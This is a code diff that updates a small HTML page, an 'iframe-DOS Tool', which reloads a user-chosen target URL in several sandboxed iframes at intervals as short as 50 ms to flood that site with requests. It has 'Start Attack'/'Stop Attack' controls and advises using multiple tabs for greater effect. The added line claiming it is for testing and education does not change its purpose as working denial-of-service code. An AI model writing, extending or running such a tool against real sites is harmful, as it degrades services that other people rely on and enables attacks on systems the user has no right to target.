@@ -1,20 +1,169 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>iframe-DOS Tool</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      background: #f2f2f2;
+      padding: 2rem;
+    }
 
-<body style="text-align:center">
-    <p>It works better by opening multiple browser tabs</p>
-    <div>
-        <input type="text" id="url" placeholder="Target url - like: http://url.com">
-        <input type="text" id="time" value="125" placeholder="Refresh loop time(ms) - 125 recomended">
-        <input type="button" value="attack!" onclick="run()">
-    </div>
-    <iframe id="addr" width="800" height="600" sandbox></iframe>
-    <p id="des"></p>
-    <script>
-        function run() {
-            setInterval(function () { document.getElementById("addr").src = document.getElementById("url").value; }, document.getElementById("time").value);
-            document.getElementById("des").innerHTML = document.getElementById("url").value +" is under attack! :)"
-        }
-    </script>
+    h1 {
+      color: #444;
+    }
+
+    .input-group {
+      margin: 1rem 0;
+    }
+
+    input[type="text"],
+    input[type="number"] {
+      padding: 0.5rem;
+      width: 250px;
+      margin: 0.5rem;
+      border-radius: 4px;
+      border: 1px solid #ccc;
+    }
+
+    input[type="button"] {
+      padding: 0.6rem 1.2rem;
+      background-color: #3498db;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    input[type="button"]:hover {
+      background-color: #2980b9;
+    }
+
+    #iframeContainer {
+      display: flex;
+      justify-content: center;
+      gap: 1rem;
+      margin-top: 2rem;
+      flex-wrap: wrap;
+    }
+
+    iframe {
+      border: 3px solid #ccc;
+      border-radius: 6px;
+      transition: border-color 0.3s ease;
+    }
+
+    .active-frame {
+      border-color: #e74c3c;
+    }
+
+    #log {
+      margin-top: 1rem;
+      font-size: 0.9rem;
+      color: #555;
+      white-space: pre-line;
+    }
+  </style>
+</head>
+<body>
+  <h1>iframe-DOS Tool</h1>
+  <p>For testing and educational purposes only.</p>
+
+  <div class="input-group">
+    <input type="text" id="url" placeholder="Target URL (e.g., http://example.com)">
+    <input type="number" id="time" value="125" min="50" placeholder="Refresh interval (min 50ms)">
+    <input type="number" id="frames" value="3" min="1" max="10" placeholder="Number of iframes">
+    <input type="button" id="toggleBtn" value="Start Attack">
+  </div>
+
+  <div id="iframeContainer"></div>
+
+  <div id="log"></div>
+
+  <script>
+    let isRunning = false;
+    let intervalId;
+    let countdownIds = [];
+    let activeIndex = 0;
+
+    function logMessage(message) {
+      const log = document.getElementById("log");
+      log.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+    }
+
+    function clearFrames() {
+      clearInterval(intervalId);
+      countdownIds.forEach(id => clearInterval(id));
+      countdownIds = [];
+      document.getElementById("iframeContainer").innerHTML = "";
+    }
+
+    function run() {
+      const url = document.getElementById("url").value.trim();
+      let interval = parseInt(document.getElementById("time").value, 10);
+      let frameCount = parseInt(document.getElementById("frames").value, 10);
+
+      if (!url || isNaN(interval) || interval < 50) {
+        alert("Please enter a valid URL and minimum refresh time of 50ms.");
+        return;
+      }
+
+      if (frameCount < 1 || frameCount > 10) {
+        alert("Iframe count must be between 1 and 10.");
+        return;
+      }
+
+      clearFrames();
+      const container = document.getElementById("iframeContainer");
+
+      for (let i = 0; i < frameCount; i++) {
+        const iframe = document.createElement("iframe");
+        iframe.width = "300";
+        iframe.height = "250";
+        iframe.sandbox = "";
+        iframe.id = `frame-${i}`;
+        container.appendChild(iframe);
+      }
+
+      // Setup visual refresh loop
+      intervalId = setInterval(() => {
+        const iframes = document.querySelectorAll("iframe");
+        iframes.forEach((frame, index) => {
+          frame.src = url;
+          frame.classList.remove("active-frame");
+        });
+        iframes[activeIndex % iframes.length].classList.add("active-frame");
+        activeIndex++;
+        logMessage(`${url} refreshed on all ${iframes.length} iframes.`);
+      }, interval);
+
+      // Setup countdown
+      const iframes = document.querySelectorAll("iframe");
+      iframes.forEach((frame, i) => {
+        let counter = interval / 1000;
+        const id = setInterval(() => {
+          counter -= 0.1;
+          frame.title = `Refreshing in ${counter.toFixed(1)}s`;
+          if (counter <= 0) counter = interval / 1000;
+        }, 100);
+        countdownIds.push(id);
+      });
+    }
+
+    document.getElementById("toggleBtn").onclick = function () {
+      if (!isRunning) {
+        run();
+        this.value = "Stop Attack";
+        isRunning = true;
+      } else {
+        clearFrames();
+        logMessage("Attack stopped.");
+        this.value = "Start Attack";
+        isRunning = false;
+      }
+    };
+  </script>
 </body>
-
 </html>
